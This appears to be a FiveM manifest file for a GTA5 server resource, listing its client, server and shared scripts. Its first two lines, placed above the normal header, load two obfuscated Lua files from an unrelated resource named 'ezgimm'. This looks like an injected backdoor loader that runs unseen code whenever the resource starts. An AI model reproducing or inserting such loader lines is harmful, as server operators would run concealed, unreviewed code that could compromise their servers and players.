shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'
fx_version 'cerulean'

author 'KevinGirardx'

game 'gta5'

client_scripts {
	'client/*.lua',
}

server_scripts {
	'server/*.lua',
}

shared_scripts {
	'@ox_lib/init.lua',
	'config.lua',
}

lua54 'yes'